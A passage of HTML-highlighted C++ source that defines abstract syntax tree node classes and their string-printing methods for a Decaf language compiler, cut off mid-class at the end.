class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;default-defs.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;list&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> YYTOKENTYPE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;decafast.tab.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="comment">/// decafAST - Base class for all abstract syntax tree nodes.</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafAST</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="keyword">virtual</span> ~<span class="built_in">decafAST</span>() &#123;&#125;</span><br><span class="line">  <span class="function"><span class="keyword">virtual</span> string <span class="title">str</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;&quot;</span>); &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">string <span class="title">getString</span><span class="params">(decafAST *d)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (d != <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> d-&gt;<span class="built_in">str</span>();</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;None&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="function">string <span class="title">commaList</span><span class="params">(list&lt;T&gt; vec)</span> </span>&#123;</span><br><span class="line">    <span class="function">string <span class="title">s</span><span class="params">(<span class="string">&quot;&quot;</span>)</span></span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">typename</span> list&lt;T&gt;::iterator i = vec.<span class="built_in">begin</span>(); i != vec.<span class="built_in">end</span>(); i++) &#123; </span><br><span class="line">        s = s + (s.<span class="built_in">empty</span>() ? <span class="built_in">string</span>(<span class="string">&quot;&quot;</span>) : <span class="built_in">string</span>(<span class="string">&quot;,&quot;</span>)) + (*i)-&gt;<span class="built_in">str</span>(); </span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="keyword">if</span> (s.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">        s = <span class="built_in">string</span>(<span class="string">&quot;None&quot;</span>);</span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafAllexp</span> :</span> <span class="keyword">public</span> decafAST &#123;</span><br><span class="line">	string Kind;</span><br><span class="line">	string Name;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function">string <span class="title">get_name</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> <span class="keyword">this</span>-&gt;Name; &#125;</span><br><span class="line">	<span class="built_in">decafAllexp</span>(string name,string kind) : <span class="built_in">Name</span>(name),<span class="built_in">Kind</span>(kind)&#123;</span><br><span class="line">		map&lt;string,<span class="keyword">int</span>&gt; tab = &#123;</span><br><span class="line">			&#123;<span class="string">&quot;&#x27;\\t&#x27;&quot;</span>,<span class="string">&#x27;\t&#x27;</span>&#125;,</span><br><span class="line">			&#123;<span class="string">&quot;&#x27;\\r&#x27;&quot;</span>,<span class="string">&#x27;\r&#x27;</span>&#125;,</span><br><span class="line">			&#123;<span class="string">&quot;&#x27;\\n&#x27;&quot;</span>,<span class="string">&#x27;\n&#x27;</span>&#125;,</span><br><span class="line">			&#123;<span class="string">&quot;&#x27;\\a&#x27;&quot;</span>,<span class="string">&#x27;\a&#x27;</span>&#125;,</span><br><span class="line">			&#123;<span class="string">&quot;&#x27;\\v&#x27;&quot;</span>,<span class="string">&#x27;\v&#x27;</span>&#125;,</span><br><span class="line">			&#123;<span class="string">&quot;&#x27;\\b&#x27;&quot;</span>,<span class="string">&#x27;\b&#x27;</span>&#125;,</span><br><span class="line">			&#123;<span class="string">&quot;&#x27;\\f&#x27;&quot;</span>,<span class="string">&#x27;\f&#x27;</span>&#125;,</span><br><span class="line">			&#123;<span class="string">&quot;&#x27;\\\\&#x27;&quot;</span>,<span class="string">&#x27;\\&#x27;</span>&#125;,</span><br><span class="line">			&#123;<span class="string">&quot;&#x27;\\\&#x27;&#x27;&quot;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>&#125;,</span><br><span class="line">			&#123;<span class="string">&quot;&#x27;\\\&quot;&#x27;&quot;</span>,<span class="string">&#x27;\&quot;&#x27;</span>&#125;,</span><br><span class="line">		&#125;;</span><br><span class="line">		<span class="keyword">if</span>( kind == <span class="string">&quot;NumberExpr&quot;</span>)&#123;</span><br><span class="line">			<span class="keyword">if</span>(tab.<span class="built_in">count</span>(<span class="keyword">this</span>-&gt;Name))&#123;</span><br><span class="line">				<span class="keyword">this</span>-&gt;Name = <span class="built_in">to_string</span>(tab[<span class="keyword">this</span>-&gt;Name]);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;Name.<span class="built_in">size</span>() == <span class="number">1</span>)&#123;</span><br><span class="line">				<span class="keyword">this</span>-&gt;Name = <span class="built_in">to_string</span>(Name[<span class="number">0</span>]<span class="number">-48</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;Name.<span class="built_in">size</span>() == <span class="number">3</span> &amp;&amp; ( <span class="keyword">this</span>-&gt;Name[<span class="number">0</span>]==<span class="string">&#x27;\&#x27;&#x27;</span> || <span class="keyword">this</span>-&gt;Name[<span class="number">0</span>]==<span class="string">&#x27;\&quot;&#x27;</span> ))&#123;</span><br><span class="line">				<span class="keyword">this</span>-&gt;Name = <span class="built_in">to_string</span>(Name[<span class="number">1</span>]);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> Kind + <span class="string">&quot;(&quot;</span> + Name + <span class="string">&quot;)&quot;</span>; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafArrexp</span> :</span> <span class="keyword">public</span> decafAST &#123;</span><br><span class="line">	string Name;</span><br><span class="line">	decafAllexp * Exp;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">decafArrexp</span>(string Name, decafAllexp *Exp) </span><br><span class="line">		: <span class="built_in">Name</span>(Name), <span class="built_in">Exp</span>(Exp) &#123;&#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;ArrayLocExpr&quot;</span>) + <span class="string">&quot;(&quot;</span> + Name + <span class="string">&quot;,&quot;</span> + <span class="built_in">getString</span>(Exp) + <span class="string">&quot;)&quot;</span>; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafBinexp</span> :</span> <span class="keyword">public</span> decafAST &#123;</span><br><span class="line">	string Option;</span><br><span class="line">	decafAllexp * Exp1;</span><br><span class="line">	decafAllexp * Exp2;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">decafBinexp</span>(string op, decafAllexp *exp1, decafAllexp *exp2) </span><br><span class="line">		: <span class="built_in">Option</span>(op), <span class="built_in">Exp1</span>(exp1), <span class="built_in">Exp2</span>(exp2) &#123;&#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;BinaryExpr&quot;</span>) + <span class="string">&quot;(&quot;</span> + Option + <span class="string">&quot;,&quot;</span> + <span class="built_in">getString</span>(Exp1) + <span class="string">&quot;,&quot;</span> + <span class="built_in">getString</span>(Exp2) + <span class="string">&quot;)&quot;</span>; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafUnaryexp</span> :</span> <span class="keyword">public</span> decafAST &#123;</span><br><span class="line">	string Option;</span><br><span class="line">	decafAllexp * Exp1;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">decafUnaryexp</span>(string op, decafAllexp *exp1) </span><br><span class="line">		: <span class="built_in">Option</span>(op), <span class="built_in">Exp1</span>(exp1) &#123;&#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;UnaryExpr&quot;</span>) + <span class="string">&quot;(&quot;</span> + Option + <span class="string">&quot;,&quot;</span> + <span class="built_in">getString</span>(Exp1) + <span class="string">&quot;)&quot;</span>; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafType</span> :</span> <span class="keyword">public</span> decafAST &#123;</span><br><span class="line">	string Type;</span><br><span class="line">	string Name;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function">string <span class="title">get_type</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> <span class="keyword">this</span>-&gt;Type; &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_name</span><span class="params">(string Name)</span></span>&#123; <span class="keyword">this</span>-&gt;Name = Name;&#125;</span><br><span class="line">	<span class="built_in">decafType</span>(string Type)&#123;<span class="keyword">this</span>-&gt;Type = Type;&#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(Name != <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="string">&quot;VarDef(&quot;</span>+Name+<span class="string">&quot;,&quot;</span>+Type+<span class="string">&quot;)&quot;</span>; </span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="string">&quot;VarDef(&quot;</span>+Type+<span class="string">&quot;)&quot;</span>; </span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafVar</span> :</span> <span class="keyword">public</span> decafAST &#123;</span><br><span class="line">	string Type;</span><br><span class="line">	string Name;</span><br><span class="line">	string Kind;</span><br><span class="line">	decafAllexp* Exp;</span><br><span class="line">	decafAllexp* Arr;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">decafVar</span>(string Name) &#123;<span class="keyword">this</span>-&gt;Name = Name;&#125;</span><br><span class="line">	<span class="function">string <span class="title">get_type</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> <span class="keyword">this</span>-&gt;Type;&#125;</span><br><span class="line">	<span class="function">string <span class="title">get_name</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> <span class="keyword">this</span>-&gt;Name;&#125;</span><br><span class="line">	<span class="function">decafAllexp* <span class="title">get_arr</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> <span class="keyword">this</span>-&gt;Arr;&#125;</span><br><span class="line">	<span class="function">decafAllexp* <span class="title">get_exp</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> <span class="keyword">this</span>-&gt;Exp;&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_type</span><span class="params">(string Type)</span></span>&#123;<span class="keyword">this</span>-&gt;Type = Type;&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_name</span><span class="params">(string Name)</span></span>&#123;<span class="keyword">this</span>-&gt;Name = Name;&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_kind</span><span class="params">(string Kind)</span></span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">this</span>-&gt;Kind == <span class="string">&quot;&quot;</span>)</span><br><span class="line">			<span class="keyword">this</span>-&gt;Kind = Kind;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_arr</span><span class="params">(decafAllexp* Arr)</span></span>&#123;<span class="keyword">this</span>-&gt;Arr = Arr;&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_exp</span><span class="params">(decafAllexp* Exp)</span></span>&#123;<span class="keyword">this</span>-&gt;Exp = Exp;&#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; </span><br><span class="line">		<span class="keyword">if</span>(Exp != <span class="literal">NULL</span>)&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="string">&quot;AssignGlobalVar(&quot;</span>+Name+<span class="string">&quot;,&quot;</span>+Type+<span class="string">&quot;,&quot;</span>+<span class="built_in">getString</span>(Exp)+<span class="string">&quot;)&quot;</span>; </span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(Kind != <span class="string">&quot;&quot;</span> &amp;&amp; Name != <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="string">&quot;FieldDecl(&quot;</span>+Name+<span class="string">&quot;,&quot;</span>+Type+<span class="string">&quot;,&quot;</span>+Kind+<span class="string">&quot;)&quot;</span>; </span><br><span class="line">		&#125;	</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(Name != <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="string">&quot;VarDef(&quot;</span>+Name+<span class="string">&quot;,&quot;</span>+Type+<span class="string">&quot;)&quot;</span>; </span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="string">&quot;VarDef(&quot;</span>+Type+<span class="string">&quot;)&quot;</span>; </span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafVarList</span> :</span> <span class="keyword">public</span> decafAST &#123;</span><br><span class="line">	list&lt;decafVar*&gt; List;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function">list&lt;decafVar*&gt; <span class="title">get_list</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> <span class="keyword">this</span>-&gt;List; &#125;</span><br><span class="line">	<span class="function"><span class="keyword">int</span> <span class="title">size</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> List.<span class="built_in">size</span>(); &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">push_front</span><span class="params">(decafVar *e)</span> </span>&#123; List.<span class="built_in">push_front</span>(e); &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">push_back</span><span class="params">(decafVar *e)</span> </span>&#123; List.<span class="built_in">push_back</span>(e); &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">cat_front</span><span class="params">(decafVarList* List)</span> </span>&#123;</span><br><span class="line">		list&lt;decafVar*&gt; l = List-&gt;<span class="built_in">get_list</span>();</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">auto</span> e:l)&#123;</span><br><span class="line">			<span class="keyword">this</span>-&gt;List.<span class="built_in">push_front</span>(e); </span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_types</span><span class="params">(string Type)</span></span>&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">auto</span> e:<span class="keyword">this</span>-&gt;List)&#123;</span><br><span class="line">			e-&gt;<span class="built_in">put_type</span>(Type); </span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_kinds</span><span class="params">(string Kind)</span></span>&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">auto</span> e:<span class="keyword">this</span>-&gt;List)&#123;</span><br><span class="line">			e-&gt;<span class="built_in">put_kind</span>(Kind); </span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123;<span class="keyword">return</span> commaList&lt;class decafVar *&gt;(List);&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/// decafStmtList - List of Decaf statements</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafStmtList</span> :</span> <span class="keyword">public</span> decafAST &#123;</span><br><span class="line">	list&lt;decafAST *&gt; stmts;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">decafStmtList</span>() &#123;&#125;</span><br><span class="line">	~<span class="built_in">decafStmtList</span>() &#123;</span><br><span class="line">		<span class="keyword">for</span> (list&lt;decafAST *&gt;::iterator i = stmts.<span class="built_in">begin</span>(); i != stmts.<span class="built_in">end</span>(); i++) &#123; </span><br><span class="line">			<span class="keyword">delete</span> *i;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">int</span> <span class="title">size</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> stmts.<span class="built_in">size</span>(); &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">push_front</span><span class="params">(decafAST *e)</span> </span>&#123; stmts.<span class="built_in">push_front</span>(e); &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">push_back</span><span class="params">(decafAST *e)</span> </span>&#123; stmts.<span class="built_in">push_back</span>(e); &#125;</span><br><span class="line">	<span class="function">list&lt;decafAST *&gt; <span class="title">get_para</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> stmts; &#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> commaList&lt;class decafAST *&gt;(stmts); &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafAssign</span> :</span> <span class="keyword">public</span> decafAST &#123;</span><br><span class="line">	string Var;</span><br><span class="line">	<span class="keyword">bool</span> key;</span><br><span class="line">	decafAllexp* Arr;</span><br><span class="line">	decafAllexp* Exp;</span><br><span class="line">	decafAllexp* Exp2;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_arr</span><span class="params">(decafAllexp* Arr)</span></span>&#123;<span class="keyword">this</span>-&gt;Arr = Arr;&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_key</span><span class="params">(<span class="keyword">bool</span> key)</span></span>&#123;<span class="keyword">this</span>-&gt;key = key;&#125;</span><br><span class="line">	<span class="built_in">decafAssign</span>(string Var,decafAllexp* Exp,decafAllexp* Exp2):<span class="built_in">Var</span>(Var),<span class="built_in">Exp</span>(Exp),<span class="built_in">Exp2</span>(Exp2)&#123;&#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; </span><br><span class="line">		<span class="keyword">if</span>(Arr == <span class="literal">NULL</span>)</span><br><span class="line">			<span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;AssignVar&quot;</span>) + <span class="string">&quot;(&quot;</span> + Var + <span class="string">&quot;,&quot;</span> + <span class="built_in">getString</span>(Exp) + <span class="string">&quot;)&quot;</span>;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;AssignArrayLoc&quot;</span>) + <span class="string">&quot;(&quot;</span> + Var + <span class="string">&quot;,&quot;</span> + <span class="built_in">getString</span>(Arr)+<span class="string">&quot;,&quot;</span>+ <span class="built_in">getString</span>(Exp) + <span class="string">&quot;)&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafAssignList</span> :</span> <span class="keyword">public</span> decafAST &#123;</span><br><span class="line">	list&lt;decafAssign *&gt;List;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="keyword">int</span> <span class="title">size</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> List.<span class="built_in">size</span>(); &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">push_front</span><span class="params">(decafAssign *e)</span> </span>&#123; List.<span class="built_in">push_front</span>(e); &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">push_back</span><span class="params">(decafAssign *e)</span> </span>&#123; List.<span class="built_in">push_back</span>(e); &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_keys</span><span class="params">(<span class="keyword">bool</span> key)</span></span>&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">auto</span> ass:List)&#123;</span><br><span class="line">			ass-&gt;<span class="built_in">put_key</span>(key);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; </span><br><span class="line">		<span class="keyword">return</span> commaList&lt;class decafAssign *&gt;(List);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafFunCall</span> :</span> <span class="keyword">public</span> decafAST &#123;</span><br><span class="line">	string Name;</span><br><span class="line">	list&lt;decafAST *&gt; Para;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_para</span><span class="params">(list&lt;decafAST *&gt;  Para)</span></span>&#123; <span class="keyword">this</span>-&gt;Para = Para; &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_name</span><span class="params">(string *Name)</span></span>&#123; <span class="keyword">this</span>-&gt;Name = *Name; &#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; </span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;MethodCall&quot;</span>) + <span class="string">&quot;(&quot;</span> + Name + <span class="string">&quot;,&quot;</span> + commaList&lt;class decafAST *&gt;(Para) + <span class="string">&quot;)&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafOutput</span> :</span> <span class="keyword">public</span> decafAST &#123;</span><br><span class="line">	string Data;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">decafOutput</span>(string Data)&#123;<span class="keyword">this</span>-&gt;Data = Data;&#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> Data; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafPara</span> :</span> <span class="keyword">public</span> decafAST &#123;</span><br><span class="line">	list&lt;decafType *&gt; Para;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="keyword">int</span> <span class="title">size</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> Para.<span class="built_in">size</span>(); &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">push_front</span><span class="params">(decafType *e)</span> </span>&#123; Para.<span class="built_in">push_front</span>(e); &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">push_back</span><span class="params">(decafType *e)</span> </span>&#123; Para.<span class="built_in">push_back</span>(e); &#125;</span><br><span class="line">	<span class="function">list&lt;decafType *&gt; <span class="title">get_para</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> Para; &#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> commaList&lt;class decafType *&gt;(Para); &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PackageAST</span> :</span> <span class="keyword">public</span> decafAST &#123;</span><br><span class="line">	string Name;</span><br><span class="line">	decafVarList *FieldDeclList;</span><br><span class="line">	decafStmtList *MethodDeclList;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">PackageAST</span>(string name, decafVarList *fieldlist, decafStmtList *methodlist) </span><br><span class="line">		: <span class="built_in">Name</span>(name), <span class="built_in">FieldDeclList</span>(fieldlist), <span class="built_in">MethodDeclList</span>(methodlist) &#123;&#125;</span><br><span class="line">	~<span class="built_in">PackageAST</span>() &#123; </span><br><span class="line">		<span class="keyword">if</span> (FieldDeclList != <span class="literal">NULL</span>) &#123; <span class="keyword">delete</span> FieldDeclList; &#125;</span><br><span class="line">		<span class="keyword">if</span> (MethodDeclList != <span class="literal">NULL</span>) &#123; <span class="keyword">delete</span> MethodDeclList; &#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; </span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;Package&quot;</span>) + <span class="string">&quot;(&quot;</span> + Name + <span class="string">&quot;,&quot;</span> + <span class="built_in">getString</span>(FieldDeclList) + <span class="string">&quot;,&quot;</span> + <span class="built_in">getString</span>(MethodDeclList) + <span class="string">&quot;)&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafFuncDef</span> :</span> <span class="keyword">public</span> decafAST &#123;</span><br><span class="line">	string Name;</span><br><span class="line">	string Type;</span><br><span class="line">	decafPara * Para;</span><br><span class="line">	decafStmtList * Block;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_para</span><span class="params">(decafPara * Para)</span></span>&#123; <span class="keyword">this</span>-&gt;Para = Para;&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_name</span><span class="params">(string *Name)</span></span>&#123; <span class="keyword">this</span>-&gt;Name = *Name; &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_type</span><span class="params">(string Type)</span></span>&#123; <span class="keyword">this</span>-&gt;Type = Type; &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_block</span><span class="params">(decafStmtList *Block)</span></span>&#123; <span class="keyword">this</span>-&gt;Block = Block; &#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; </span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;Method&quot;</span>) + <span class="string">&quot;(&quot;</span> + Name + <span class="string">&quot;,&quot;</span> + Type + <span class="string">&quot;,&quot;</span> + <span class="built_in">getString</span>(Para) + <span class="string">&quot;,&quot;</span> + <span class="built_in">getString</span>(Block) + <span class="string">&quot;)&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafEXFuncDef</span> :</span> <span class="keyword">public</span> decafAST &#123;</span><br><span class="line">	string Name;</span><br><span class="line">	string Type;</span><br><span class="line">	decafPara* Para;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_para</span><span class="params">(decafPara* Para)</span></span>&#123; <span class="keyword">this</span>-&gt;Para = Para;&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_name</span><span class="params">(string *Name)</span></span>&#123; <span class="keyword">this</span>-&gt;Name = *Name; &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_type</span><span class="params">(string Type)</span></span>&#123; <span class="keyword">this</span>-&gt;Type = Type; &#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; </span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;ExternFunction&quot;</span>) + <span class="string">&quot;(&quot;</span> + Name + <span class="string">&quot;,&quot;</span> + Type + <span class="string">&quot;,&quot;</span> + <span class="built_in">getString</span>(Para) + <span class="string">&quot;)&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafBlock</span> :</span> 